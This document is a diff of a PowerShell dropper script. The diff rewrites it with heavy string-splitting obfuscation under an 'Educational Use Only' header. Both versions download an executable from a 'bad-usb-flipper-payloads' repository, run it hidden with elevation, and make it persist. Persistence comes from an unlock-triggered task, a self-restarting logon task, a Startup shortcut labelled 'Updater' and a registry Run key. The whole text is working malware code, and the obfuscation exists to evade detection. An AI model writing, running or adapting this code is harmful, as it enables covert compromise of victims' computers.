@@ -1,23 +1,32 @@
-$u = "$env:APPDATA\WinUman.exe"
-(New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/EXE/WinUman.exe", $u)
-Start-Process -Fi $u -Verb RunAs -WindowStyle Hidden
+# Educational Use Only — Extremely Obfuscated Gibberish Script
 
-$esc = $u -replace '\\','\\\\'
-iex "schtasks /Create /F /TN WinUmanUnlock /TR $esc /SC ONUNLOCK /RL HIGHEST /RU $env:USERNAME"
+${___} = "ht"+"tps"+"://ra"+"w.githubusercontent"+"."+"com/the-shadow-walker/bad-usb-flipper-payloads/main/EXE/"+"WinUman.exe"
+${__1} = $env:APPDATA + '\' + ('W'+'i'+'n'+'U'+'m'+'a'+'n'+'.e'+'x'+'e')
+${___2} = $env:APPDATA + '\Mic'+'ros'+'oft\Win'+'dows\Start '+'Menu\Programs\Startup\WinUman.lnk'
 
-$a = New-ScheduledTaskAction -Execute $u
-$l = New-ScheduledTaskTrigger -AtLogOn
-$sT = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RestartCount 5 -RestartInterval (New-TimeSpan -Minutes 1) -StartWhenAvailable
-$pC = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
-$t = New-ScheduledTask -Action $a -Trigger $l -Settings $sT -Principal $pC
-Register-ScheduledTask -TaskName "WinUmanResilient" -InputObject $t -Force
+${o0o} = New-Object Net.WebClient
+$o0o.DowNLoADFiLe(${___}, ${__1})
 
-$w = New-Object -ComObject WScript.Shell
-$s = $w.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WinUman.lnk")
-$s.TargetPath = $u
-$s.WorkingDirectory = Split-Path $u
-$s.WindowStyle = 7
-$s.Description = "Updater"
-$s.Save()
+&("Sta"+"rt-Pro"+"cess") -FilePath ${__1} -Verb RunAs -WindowStyle Hidden
 
-Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WinUman" -Value $u
+$__TR = ${__1} -replace '\\','\\\\'
+&('ie'+'x') ("schtasks /Create /F /TN "+"WinUmanUnlock /TR "+$__TR+" /SC ONUNLOCK /RL HIGHEST /RU "+$env:USERNAME)
+
+$__act = &("New"+"-Sched"+"uled"+"Task"+"Action") -Execute ${__1}
+$__tri = &('New'+'-Sche'+'duledTaskTrig'+'ger') -AtLogOn
+$__set = &('New-Sche'+'duledTaskSettingsSet') -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
+    -RestartCount 5 -RestartInterval (&('New-T'+'imeSp'+'an') -Minutes 1) -StartWhenAvailable
+$__pri = &('New-Sched'+'uledTaskPrincipal') -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
+$__tsk = &('New-Sche'+'duledTask') -Action $__act -Trigger $__tri -Settings $__set -Principal $__pri
+&('Register'+'-ScheduledTask') -TaskName ('WinUmanResilient') -InputObject $__tsk -Force
+
+$___ws = &('New-Object') -ComObject ('WScript.Shell')
+$___sc = $___ws.('Cr'+'eat'+'eSh'+'ortcut')(${___2})
+$___sc.('Targ'+'etPath') = ${__1}
+$___sc.('Worki'+'ngDirectory') = &('Split-Path') ${__1}
+$___sc.('Wind'+'owStyle') = 7
+$___sc.('Desc'+'ription') = "Updater"
+$___sc.Save()
+
+&('Set-ItemPro'+'perty') -Path ("HKCU:\Soft"+"ware\Microsoft\Windows\CurrentVersion\Run") `
+    -Name "WinUman" -Value ${__1}
